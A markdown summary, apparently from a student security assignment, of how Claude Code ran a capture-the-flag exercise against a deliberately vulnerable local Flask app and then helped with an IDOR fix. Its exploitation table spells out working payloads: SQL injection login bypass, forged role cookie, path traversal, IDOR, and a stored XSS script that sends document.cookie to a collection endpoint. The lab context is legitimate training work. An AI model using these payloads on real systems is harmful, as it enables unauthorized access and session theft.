# Agentic Workflow Evidence

This project was driven end-to-end through Claude Code. This is a
faithful summary of the goal → tool calls → review loop used during the
live session (not a reconstruction after the fact).

## 1. Setup

- **Goal:** get the starter files into a proper repo and the target app
  running under the right seed.
- **Tool calls:** unzipped the instructor-provided starter archive,
  created a git repo, copied `track_a_vulnhub/` into the repo root, ran
  `my_seeds.py abcrenshaw` to derive `FLAG_SEED`, created a Python venv,
  installed `flask`, started `app.py` in the background with
  `FLAG_SEED=abcrenshaw`.
- **Review:** confirmed via `curl` that the home page loaded with **no**
  red "DEFAULT seed" banner, proving the app was running under the
  correct per-student seed before any exploitation began.

## 2. Recon

- **Goal:** find the six challenges mentioned on the home page without
  guessing blindly.
- **Tool calls:** fetched `/` and extracted the "Challenge board" hint
  list; fetched `/robots.txt`; inspected the HTML of `/login` for its
  exact form field names.
- **Review:** `robots.txt` disclosed a `Disallow: /backups/` entry —
  directly flagged as the breadcrumb for the sensitive-data-exposure
  challenge — and the login form's field names (`username`, `password`)
  were confirmed before building any payload.

## 3. Exploitation (one vulnerability class at a time)

For each of the six challenges, the loop was: form a hypothesis from the
home-page hint → send a real HTTP request (`curl`) to test it → read the
response → either confirm the flag or adjust the payload and retry.

| Step | Hypothesis | Request sent | Result |
|---|---|---|---|
| Exposure | `robots.txt` hints at a hidden path | `GET /backups/vulnhub.sql.bak` | Flag in a world-readable "backup" file |
| SQLi | Login hint says it "trusts what you type a little too much" | `POST /login` with `username=admin'--` | 302 to `/dashboard` with an admin session cookie |
| IDOR | "message pages are addressed by number" | Logged in as `alice`, then `GET /messages/1` (owned by admin) | Private message read with no ownership check |
| Authz | "/vault... how does the app know who is one?" | Decoded the `auth` cookie (`base64(user:role)`), then **forged** a `superadmin` role cookie by hand | `GET /vault` granted access with the forged cookie |
| Traversal | "the download link names a file. What else can it name?" | `GET /download?file=../private/employee_notes.txt` | Confidential file outside the intended directory served |
| Stored XSS | "An admin reads [the guestbook]" | `POST /guestbook` with a `<script>fetch('/grab?c='+document.cookie)</script>` payload, then polled `GET /grab` | Simulated admin bot executed the script and leaked its session cookie (containing the flag) to the collection endpoint |

- **Review after each step:** every flag was read from an actual HTTP
  response body — never from the filesystem or database directly — so
  each one has a matching request/response transcript saved under
  [`poc/`](poc/). `app.py` was deliberately **not** read until all six
  flags were already captured this way, specifically to keep the test
  black-box; it was read afterward only to write accurate root-cause and
  remediation notes for the report.

## 4. Verification

- **Goal:** make sure the six captured flags are valid for the correct
  seed before writing them up.
- **Tool calls:** wrote `submission.txt`, ran
  `check_flags.py submission.txt --username abcrenshaw`.
- **Review:** output was `6/6 flags valid for username abcrenshaw`,
  confirmed against the per-flag challenge names (`sqli`, `idor`, `xss`,
  `authz`, `traversal`, `exposure`) matching the six intended challenges.

## 5. Write-up

- **Goal:** turn the raw exploitation evidence into a professional
  report.
- **Tool calls:** drafted `REPORT.md` (executive summary, authorization
  statement, methodology, per-finding detail with severity and
  remediation) and six per-finding PoC files under `poc/`, each
  reproducing the exact request and response that captured its flag.
- **Review:** cross-checked every flag quoted in the report and PoC
  files against `submission.txt` and the `check_flags.py` output to
  make sure nothing was transcribed incorrectly.

## 6. Hands-on remediation practice (role reversed: human executes, AI guides)

Unlike sections 1-5, where Claude Code executed the tool calls and the
human directed and reviewed, this phase deliberately reversed those
roles as additional hands-on practice beyond the assignment's required
exploitation work.

- **Goal:** apply and test a real fix for one vulnerability (IDOR) by
  hand, rather than having the agent do it.
- **Who did what:** Claude Code explained what needed to change and
  which line it lived on, but the human wrote the code themselves in
  their own editor (not copy-pasting a ready-made snippet) and ran
  every shell command themselves (prefixed `!` in the session, so each
  command appears as the human's own input, not a tool call the agent
  executed).
- **What happened:** the first hand-edit introduced a real bug — a SQL
  query with two `?` placeholders but only one bound value — which
  crashed the server with a 500 error. Claude Code read the Flask error
  log and identified the exact cause; the human then corrected the edit
  themselves and re-ran the restart/test commands. The corrected fix
  was verified working: the exploit now returns 404 instead of the
  flag, and the legitimate case (a user reading their own message)
  still works. Afterward, the human reverted `app.py` back to its
  original vulnerable state so the submitted app still reproduces all
  6 flags; the fix is preserved separately as a reference file,
  [`poc/idor_fix_reference.py`](poc/idor_fix_reference.py).
- **Evidence:** two editor screenshots (the buggy attempt and the
  corrected version) plus the before/after `curl` transcripts are in
  [`poc/02_idor.md`](poc/02_idor.md#remediation--applied-and-manually-tested).

See the README's [`## AI Usage`](README.md#ai-usage) section for the
explicit split between what Claude Code executed and what the human
directed, reviewed, and decided.
